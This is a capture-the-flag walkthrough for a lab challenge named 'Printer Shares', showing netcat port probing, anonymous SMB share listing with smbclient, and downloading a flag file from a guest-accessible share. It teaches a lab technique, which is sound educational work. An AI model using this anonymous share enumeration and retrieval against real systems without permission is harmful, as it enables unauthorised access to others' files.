# CyLab - Printer Shares

## 🎯 Objective
Retrieve an important file (the flag) that was accidentally sent to a network printer's print server.

## 🛠️ Tools & Concepts Used
* `nc` - Netcat
* `smbclient` - cmd tool for access and interact with SMB/CIFS shares across network

## 📝 Step-by-Step Solution

**1. Probe the Network Port**
First, verify that the remote service on the specified port is accessible.

```bash
nc -vz mysterious-sea.picoctf.net 51662
```
Output:
```bash
Connection to mysterious-sea.picoctf.net (3.130.79.223) 51662 port [tcp/*] succeeded!
```
The connection is successful, confirming a service is running on that port.

**2. Enumerate SMB Shares**
Based on the challenge hints mentioning the SMB protocol, list the available SMB shares on the target. Press Enter when prompted for a password.

```bash
smbclient -L //mysterious-sea.picoctf.net -p 51662
```
Output:

```bash
	Sharename        Type     Comment
	---------        ----     -------
	shares           Disk     Public Share With Guests
	IPC$             IPC      IPC Service (Samba 4.19.5-Ubuntu)
SMB1 disabled -- no workgroup available
```
The enumeration reveals a public disk share named `shares`.

**3. Connect to the SMB Share and Download the Flag**
Connect to the `shares` directory using `smbclient`. Leave the password blank by pressing Enter.

```bash
smbclient //mysterious-sea.picoctf.net/shares -p 51662
```
Output:

```bash
smb: \>
```
Once inside the interactive prompt, list the files and download the flag:

```bash
smb: \> ls
  .                                    D         0  Fri Mar  6 21:25:41 2026
  ..                                   D         0  Fri Mar  6 21:25:41 2026
  dummy.txt                            N      1142  Wed Feb  4 22:22:17 2026
  flag.txt                             N        37  Fri Mar  6 21:25:41 2026

		65536 blocks of size 1024. 60000 blocks available
smb: \> get flag.txt
getting file \flag.txt of size 37 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

The `flag.txt` file is successfully downloaded to the local machine.

**4. Retrieve the Flag**
Exit the SMB prompt and view the contents of the downloaded `flag.txt` file in the local terminal:

```bash
cat flag.txt
```

## 💡 Key Takeaway
I learned about `smbclient` and how to use it